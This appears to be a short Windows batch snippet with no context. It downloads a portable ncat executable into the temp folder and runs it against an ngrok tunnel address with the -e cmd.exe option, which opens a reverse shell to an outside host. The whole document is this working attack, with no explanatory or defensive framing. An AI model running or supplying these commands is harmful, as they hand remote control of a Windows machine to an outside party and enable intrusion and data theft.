cd %temp%
curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe 
ncat.exe 1.tcp.in.ngrok.io 20148 -e cmd.exe